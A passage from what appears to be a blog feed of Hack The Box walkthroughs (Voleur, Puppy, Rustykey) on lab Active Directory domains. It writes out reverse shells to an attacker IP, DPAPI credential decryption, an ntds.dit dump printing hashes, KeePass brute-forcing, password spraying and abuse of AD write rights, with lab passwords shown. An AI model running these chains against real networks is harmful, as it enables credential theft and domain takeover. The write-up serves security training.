PS C:\Windows\system32&gt; Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db -TargetPath &quot;OU=Second-Line Support Technicians,DC=voleur,DC=htb&quot;

We can now get a shell as todd.wolfe same way as before.
*Evil-WinRM* PS C:\programdata&gt; .\RCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.14.2:443 -t 0[*] Warning: The logon for user &#x27;todd.wolfe&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.[+] Running in session 0 with process function CreateProcessWithLogonW()[+] Using Station\Desktop: Service-0x0-e18972$\Default[+] Async process &#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27; with pid 5340 created in background.

DPAPI AGAIN, Where in a home directory duh!!After getting a shell we look into the IT directory at the root which has First,Second,Third OUs. We can go into the second and see a archived directory. This holds the Users Directory which we have access to ours. We can from this, gather the keys we need for DPAPI. 
Exfiltrating the keys via smb didnâ€™t work, Base64 encoding and then decrypting on attacker machine.
konoha# impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password &#x27;NightT1meP1dg3on14&#x27;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[MASTERKEYFILE]Version     :        2 (2)Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88Flags       :        0 (0)Policy      :        0 (0)MasterKeyLen: 00000088 (136)BackupKeyLen: 00000068 (104)CredHistLen : 00000000 (0)DomainKeyLen: 00000174 (372)Decrypted key with User Key (MD4 protected)Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83konoha# impacket-dpapi credential -f 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[CREDENTIAL]LastWritten : 2025-01-29 12:55:19+00:00Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)Target      : Domain:target=Jezzas_AccountDescription :Unknown     :Username    : jeremy.combsUnknown     : qT3V9pLXyN7W4m
After getting credentials we again get a shell like we did before.
*Evil-WinRM* PS C:\programdata&gt; .\RCs.exe jeremy.combs qT3V9pLXyN7W4m powershell -r 10.10.14.2:443 -t 0[*] Warning: The logon for user &#x27;jeremy.combs&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.[+] Running in session 0 with process function CreateProcessWithLogonW()[+] Using Station\Desktop: Service-0x0-e18972$\Default[+] Async process &#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27; with pid 3564 created in background.
Backing it upNow going in to IT again we have the Third directory. Which contains backups, SECURITY, SYSTEM, and if we go into the Active Directory folder we find the ntds.dit. With all these transferred to our machine we can decode and get the Administrator hash.
konoha# impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCALImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d[*] Dumping cached domain logon information (domain/username:hash)[*] Dumping LSA Secrets[*] $MACHINE.ACC$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77[*] DPAPI_SYSTEMdpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3[*] NL$KM 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U... 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff.. 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)[*] Searching for pekList, be patient[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40[*] Reading and decrypting hashes from ntds.ditAdministrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;SNIP&gt;

]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>Deleted Users Accounts</tag>
        <tag>DPAPI</tag>
      </tags>
  </entry>
  <entry>
    <title>Puppy (Windows Medium)</title>
    <url>/2025/05/17/Puppy/</url>
    <content><![CDATA[
This Windows Medium box starts with our user having write permissions over the DEVELOPERS group. Once we look at shares we find available to use the DEV share. In this share lies a keepass database, which we exfiltrate to our machine. Once done we crack the password to the database and discover users and credentials. After password spraying we have another valid user, and this user is in the SENIOR DEVS group, with GenericAll to user Adam.Silver. After re-enabling his account, we can finally get on the box. Going to the root directory we find a Backups directory with a zip file containing an xml file with credentials for Steph.Cooper. Using these credentials we login, and if we looked at bloodhound or other users we noticed a steph.cooper_adm. With access to this users AppData we exfiltrate the file required for DPAPI. Once we dump DPAPI, we find credentials for steph.cooper_adm.
Starts as an assumed breach with credentials: levi.james &#x2F; KingofAkron2025!
Initial NmapPORT     STATE SERVICE       REASON          VERSION53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-19 23:17:01Z)111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)| rpcinfo:|   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/tcp6  rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  2,3,4        111/udp6  rpcbind|   100003  2,3         2049/udp   nfs|   100003  2,3         2049/udp6  nfs|   100005  1,2,3       2049/udp   mountd|   100005  1,2,3       2049/udp6  mountd|   100021  1,2,3,4     2049/tcp   nlockmgr|   100021  1,2,3,4     2049/tcp6  nlockmgr|   100021  1,2,3,4     2049/udp   nlockmgr|   100021  1,2,3,4     2049/udp6  nlockmgr|   100024  1           2049/tcp   status|   100024  1           2049/tcp6  status|   100024  1           2049/udp   status|_  100024  1           2049/udp6  status135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds? syn-ack ttl 127464/tcp  open  kpasswd5?     syn-ack ttl 127593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0636/tcp  open  tcpwrapped    syn-ack ttl 1272049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)3260/tcp open  iscsi?        syn-ack ttl 1273268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)3269/tcp open  tcpwrapped    syn-ack ttl 1275985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:|   date: 2025-08-19T23:18:50|_  start_date: N/A|_clock-skew: -55m40s| smb2-security-mode:|   3:1:1:|_    Message signing enabled and required| p2p-conficker:|   Checking for Conficker.C or higher...|   Check 1 (port 62785/tcp): CLEAN (Timeout)|   Check 2 (port 31083/tcp): CLEAN (Timeout)|   Check 3 (port 26380/udp): CLEAN (Timeout)|   Check 4 (port 63353/udp): CLEAN (Timeout)|_  0/4 checks are positive: Host is CLEAN or ports are blocked

What are we doing as the KINGAt first, I wanted to check and see what we have writable.
konoha# bloodyAD -v DEBUG -d puppy.htb -u levi.james -p &#x27;KingofAkron2025!&#x27; --dc-ip 10.10.11.70 --host puppy.htb get writable[+] Connection URL: ldap+ntlm-pw://puppy.htb\levi.james:KingofAkron2025%21@puppy.htb/?serverip=10.10.11.70[*] Trying to connect to puppy.htb...[+] Connection successfuldistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=PUPPY,DC=HTBpermission: WRITEdistinguishedName: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTBpermission: WRITEdistinguishedName: CN=DEVELOPERS,DC=PUPPY,DC=HTBpermission: WRITE

This shows us we can add ourselves to this group since we have write.
konoha# bloodyAD -v DEBUG -d puppy.htb -u levi.james -p &#x27;KingofAkron2025!&#x27; --dc-ip 10.10.11.70 --host puppy.htb add groupMember &#x27;Developers&#x27; &#x27;levi.james&#x27;[+] Connection URL: ldap+ntlm-pw://puppy.htb\levi.james:KingofAkron2025%21@puppy.htb/?serverip=10.10.11.70[*] Trying to connect to puppy.htb...[+] Connection successful[+] levi.james added to Developers

Getting to know one another ðŸ˜‘So I went ahead and got a bloodhound dump for later use when weâ€™re futher.
konoha# rusthound -z -u levi.james@puppy.htb -p &#x27;KingofAkron2025!&#x27; -f DC.puppy.htb -d puppy.htb -i 10.10.11.70
What were you hiding??Before we didnâ€™t have read access over the DEV share. Now we can see what lingers in this share.
konoha# impacket-smbclient &#x27;puppy.htb/levi.james:KingofAkron2025!@puppy.htb&#x27;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companiesType help for list of commands# use DEV# lsdrw-rw-rw-          0  Sun Mar 23 02:07:57 2025 .drw-rw-rw-          0  Sat Mar  8 10:52:57 2025 ..-rw-rw-rw-   34394112  Sun Mar 23 02:09:12 2025 KeePassXC-2.7.9-Win64.msidrw-rw-rw-          0  Sun Mar  9 15:16:16 2025 Projects-rw-rw-rw-       2677  Tue Mar 11 21:25:46 2025 recovery.kdbx# mget recovery.kdbx[*] Downloading recovery.kdbx
A keepass database, we can crack this hash using keepass2john, or I just used keepass4brute.sh.
konoha# ./keepass4brute.sh ~/Documents/htb/machines/TMP/recovery.kdbx /usr/share/wordlists/rockyou.txtkeepass4brute 1.3 by r3nt0nhttps://github.com/r3nt0n/keepass4brute[+] Words tested: 36/14344393 - Attempts per minute: 86 - Estimated time remaining: 16 weeks, 3 days[+] Current attempt: liverpool[*] Password found: liverpool

Show me your moves!!Once in the database we have some users and some passwords we can sort through.
We can go and password spray, once we do we get a hit.
konoha# nxc smb puppy.htb -u users.lst -p passwd.lst --continue-on-successSMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)&lt;SNIP&gt;SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:Antman2025! STATUS_LOGON_FAILURESMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_LOGON_FAILURE

Lets see what he has in bloodhound.
So GenericAll, we can simply just change his password and get on the box.
konoha# bloodyAD -v DEBUG -d puppy.htb -u ant.edwards -p &#x27;Antman2025!&#x27; --dc-ip 10.10.11.70 --host puppy.htb set password adam.silver &#x27;SuperSecurePassword123!&#x27;[+] Connection URL: ldap+ntlm-pw://puppy.htb\ant.edwards:Antman2025%21@puppy.htb/?serverip=10.10.11.70[*] Trying to connect to puppy.htb...[+] Connection successful[+] Password changed successfully!
We can try to evil-winrm with his account but when we donâ€™t get connected, looking more at his account explains.
konoha# bloodyAD -v DEBUG -d puppy.htb -u ant.edwards -p &#x27;Antman2025!&#x27; --dc-ip 10.10.11.70 --host puppy.htb get object adam.silver[+] Connection URL: ldap+ntlm-pw://puppy.htb\ant.edwards:Antman2025%21@puppy.htb/?serverip=10.10.11.70[*] Trying to connect to puppy.htb...[+] Connection successfuldistinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTBaccountExpires: 9999-12-31 23:59:59.999999+00:00&lt;SNIP&gt;sAMAccountName: adam.silversAMAccountType: 805306368sn: SilveruSNChanged: 176441uSNCreated: 12814userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD

We can see its disabled, so we can simply remove the ACCOUNTDISABLE flag and try again.
konoha# bloodyAD -v DEBUG -d puppy.htb -u ant.edwards -p &#x27;Antman2025!&#x27; --dc-ip 10.10.11.70 --host puppy.htb remove uac adam.silver -f ACCOUNTDISABLE[+] Connection URL: ldap+ntlm-pw://puppy.htb\ant.edwards:Antman2025%21@puppy.htb/?serverip=10.10.11.70[*] Trying to connect to puppy.htb...[+] Connection successful[-] [&#x27;ACCOUNTDISABLE&#x27;] property flags removed from adam.silver&#x27;s userAccountControl

Silver SurfingOnce connected, we look at the root directory.
*Evil-WinRM* PS C:\&gt; ls -fo    Directory: C:\Mode                 LastWriteTime         Length Name----                 -------------         ------ ----d--hs-         2/28/2025  12:31 PM                $Recycle.Bind--h--         5/12/2025   5:29 PM                $WinREAgentd-----          5/9/2025  10:48 AM                Backupsd--hsl         2/19/2025  11:32 AM                Documents and Settingsd-----         5/12/2025   5:21 PM                inetpubd-----          5/8/2021   1:20 AM                PerfLogs&lt;SNIP&gt;
We see a backups directory, and when checking that out we find a site-backup-2024-12-30.zip. 
*Evil-WinRM* PS C:\Backups&gt; ls    Directory: C:\BackupsMode                 LastWriteTime         Length Name----                 -------------         ------ -----a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip

Once we download this and look at it, only one file looks interesting.
*Evil-WinRM* PS C:\Backups&gt; ls    Directory: C:\BackupsMode                 LastWriteTime         Length Name----                 -------------         ------ -----a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip*Evil-WinRM* PS C:\Backups&gt; download site-backup-2024-12-30.zipInfo: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zipInfo: Download successful!

Backup Files suck dude!!!Here we download the file and check it out, revealing credentials.
konoha# unzip site-backup-2024-12-30.zip puppy/nms-auth-config.xml.bak
From the backup xml file we have found the key.
konoha# cat nms-auth-config.xml.bak&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ldap-config&gt;    &lt;server&gt;        &lt;host&gt;DC.PUPPY.HTB&lt;/host&gt;        &lt;port&gt;389&lt;/port&gt;        &lt;base-dn&gt;dc=PUPPY,dc=HTB&lt;/base-dn&gt;        &lt;bind-dn&gt;cn=steph.cooper,dc=puppy,dc=htb&lt;/bind-dn&gt;        &lt;bind-password&gt;ChefSteph2025!&lt;/bind-password&gt;    &lt;/server&gt;
Lets get intersteller coop!!We can login and take a look around, but thereâ€™s nothing we havenâ€™t already seen. So the only thing to do is check DPAPI.
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; ls -h    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\CredentialsMode                 LastWriteTime         Length Name----                 -------------         ------ -----a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; attrib -H C8D69EBE9A43E9DEBF6B5FBD48B521B9Not resetting system file - C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; attrib -S -H C8D69EBE9A43E9DEBF6B5FBD48B521B9*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; ls    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\CredentialsMode                 LastWriteTime         Length Name----                 -------------         ------ -----a----          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; download C8D69EBE9A43E9DEBF6B5FBD48B521B9Info: Downloading C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D69EBE9A43E9DEBF6B5FBD48B521B9Info: Download successful!*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; cd ..*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft&gt; ls    Directory: C:\Users\steph.cooper\AppData\Roaming\MicrosoftMode                 LastWriteTime         Length Name----                 -------------         ------ ----d---s-          3/8/2025   7:53 AM                Credentialsd---s-          3/8/2025   7:40 AM                Cryptod-----          3/8/2025   7:40 AM                Internet Explorerd-----          3/8/2025   7:40 AM                Networkd---s-          3/8/2025   7:40 AM                Protectd-----          5/8/2021   1:20 AM                Spellingd---s-         2/23/2025   2:35 PM                SystemCertificatesd-----         2/23/2025   2:36 PM                Vaultd-----          3/8/2025   7:52 AM                Windows*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft&gt; cd windows*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\windows&gt; ls    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\windowsMode                 LastWriteTime         Length Name----                 -------------         ------ ----d-r---          3/8/2025   7:40 AM                AccountPicturesd-----          5/8/2021   1:20 AM                CloudStored-r---          3/8/2025   7:40 AM                Librariesd-----          5/8/2021   1:20 AM                Network Shortcutsd-----          5/8/2021   1:20 AM                Printer Shortcutsd-r---          3/8/2025   7:40 AM                Recentd-r---          3/8/2025   7:40 AM                SendTod-----          3/8/2025   7:52 AM                ServerManagerd-r---          3/8/2025   7:40 AM                Start Menud-----          5/8/2021   1:20 AM                Templatesd-----          3/8/2025   8:01 AM                Themes*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\windows&gt; cd ..*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft&gt; ls    Directory: C:\Users\steph.cooper\AppData\Roaming\MicrosoftMode                 LastWriteTime         Length Name----                 -------------         ------ ----d---s-          3/8/2025   7:53 AM                Credentialsd---s-          3/8/2025   7:40 AM                Cryptod-----          3/8/2025   7:40 AM                Internet Explorerd-----          3/8/2025   7:40 AM                Networkd---s-          3/8/2025   7:40 AM                Protectd-----          5/8/2021   1:20 AM                Spellingd---s-         2/23/2025   2:35 PM                SystemCertificatesd-----         2/23/2025   2:36 PM                Vaultd-----          3/8/2025   7:52 AM                Windows*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft&gt; cd Protect*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect&gt; ls    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\ProtectMode                 LastWriteTime         Length Name----                 -------------         ------ ----d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect&gt; download S-1-5-21-1487982659-1829050783-2281216199-1107Info: Downloading C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107 to S-1-5-21-1487982659-1829050783-2281216199-1107Info: Download successful!

Impacket this papi!Now lets dump with impacket-dpapi and see what we have.
konoha# impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password &#x27;ChefSteph2025!&#x27;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[MASTERKEYFILE]Version     :        2 (2)Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407Flags       :        0 (0)Policy      : 4ccf1275 (1288639093)MasterKeyLen: 00000088 (136)BackupKeyLen: 00000068 (104)CredHistLen : 00000000 (0)DomainKeyLen: 00000174 (372)Decrypted key with User Key (MD4 protected)Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84konoha# impacket-dpapi credential -f C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[CREDENTIAL]LastWritten : 2025-03-08 15:54:29+00:00Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)Target      : Domain:target=PUPPY.HTBDescription :Unknown     :Username    : steph.cooper_admUnknown     : FivethChipOnItsWay2025!

So It is how it isNow we can try to evil-winrm on and get the flag.
konoha# evil-winrm -i puppy.htb -u steph.cooper_adm -p &#x27;FivethChipOnItsWay2025!&#x27;Evil-WinRM shell v3.7Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module RelineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents&gt; cd \Users\Administrator\Desktop*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls    Directory: C:\Users\Administrator\DesktopMode                 LastWriteTime         Length Name----                 -------------         ------ -----ar---         8/19/2025   4:10 PM             34 root.txt


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>GenericAll</tag>
        <tag>DPAPI</tag>
      </tags>
  </entry>
  <entry>
    <title>Rustykey (Windows Hard)</title>
    <url>/2025/06/30/Rustykey/</url>
    <content><![CDATA[
This Windows Hard box starts off assumed breach. While enumerating with the credentials you find that NTLM is disabled. Using your credentials youâ€™re able to obtain a kerberos ticket that lets you get a bloodhound dump and further enumerate the machine. Once done, youâ€™re able to kerberoast SPNs(Some did timeroast) and obtain some hashes, which one of them cracks to cleartext for IT-Computer3$. Using your new found credentials youâ€™re able to abuse DACLs that allows our user to remove objects from the Protected Objects group. Thus allowing for ForceChangePassword and after successfully changing the password for bb.morgan, we are able to get a kerberos ticket, setup our krb5.conf and evil-winrm onto the box. 
Enumeration as bb.morgan shows very little, yet we had a user ee.reed in the Support group. After changing his password, creating a reverse shell and using RunasCs.exe, weâ€™re able to get a shell as ee.reed. Using PrivescCheck.ps1 shows us a COM Registry component we have FullAccess over. Abusing this gets us a reverse shell as mm.turner. Looking back in bloodhound we see that mm.turner is apart of the DelegationManagers group. This allows us to AddAllowedToAct on the domain. Once we add the attribute, we use Rubeus.exe and perform Resource-Based Constrained Delegation. This gets us a TGS which we then can use to secretsdump the domain.
As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker &#x2F; 8#t5HE8L!W3A
Initial NmapPORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-29 04:15:29Z)135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)445/tcp   open  microsoft-ds? syn-ack ttl 127464/tcp   open  kpasswd5?     syn-ack ttl 127593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped    syn-ack ttl 1273268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped    syn-ack ttl 1275985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.049671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49727/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:|   3:1:1:|_    Message signing enabled and required| p2p-conficker:|   Checking for Conficker.C or higher...|   Check 1 (port 51928/tcp): CLEAN (Couldn&#x27;t connect)|   Check 2 (port 27628/tcp): CLEAN (Couldn&#x27;t connect)|   Check 3 (port 63867/udp): CLEAN (Timeout)|   Check 4 (port 46581/udp): CLEAN (Failed to receive data)|_  0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-time:|   date: 2025-06-29T04:16:24|_  start_date: N/A|_clock-skew: 0s

Many ports open, but we can gather the domain name from it being rustykey.htb.
Enum of rr.parkerWith his creds I simply grabbed a TGT for him since NTLM is disabled and exported it for use.
konoha# impacket-getTGT &#x27;rustykey.htb/rr.parker:8#t5HE8L!W3A&#x27; -dc-ip 10.10.11.75Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[*] Saving ticket in rr.parker.ccachekonoha# export KRB5CCNAME=./rr.parker.ccache

SMB didnâ€™t let us authenticate, but LDAP worked so we can get a bloodhound dump.
konoha# nxc smb 10.10.11.75 -d rustykey.htb -k --use-kcacheSMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)SMB         10.10.11.75     445    10.10.11.75      [-] rustykey.htb\ from ccache KDC_ERR_S_PRINCIPAL_UNKNOWNkonoha# nxc ldap 10.10.11.75 -d rustykey.htb -k --use-kcacheLDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker from ccachekonoha# bloodhound-python -d rustykey.htb -u &#x27;rr.parker&#x27; -k -no-pass -ns 10.10.11.75 --zip -c Group,LocalAdmin,Session,Trusts,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL&lt;SNIP&gt;INFO: Done in 00M 10SINFO: Compressing output into 20250701022158_bloodhound.zip

No way out so it seemed!!After loading up the data, we didnâ€™t find much on our user. Never the less, we have credentials we can get a list of users and try kerberoasting.
konoha# nxc ldap 10.10.11.75 -d rustykey.htb -k --use-kcache --users --computersLDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker from ccacheLDAP        10.10.11.75     389    DC               [*] Skipping disabled account: krbtgtLDAP        10.10.11.75     389    DC               [*] Total of records returned 0LDAP        10.10.11.75     389    DC               [*] Enumerated 11 domain users: rustykey.htbLDAP        10.10.11.75     389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-LDAP        10.10.11.75     389    DC               Administrator                 2025-06-04 17:52:22 0        Built-in account for administering the computer/domainLDAP        10.10.11.75     389    DC               Guest                         &lt;never&gt;             0        Built-in account for guest access to the computer/domainLDAP        10.10.11.75     389    DC               krbtgt                        2024-12-26 18:53:40 0        Key Distribution Center Service AccountLDAP        10.10.11.75     389    DC               rr.parker                     2025-06-04 17:54:15 0LDAP        10.10.11.75     389    DC               mm.turner                     2024-12-27 04:18:39 0LDAP        10.10.11.75     389    DC               bb.morgan                     2025-07-01 02:16:40 0LDAP        10.10.11.75     389    DC               gg.anderson                   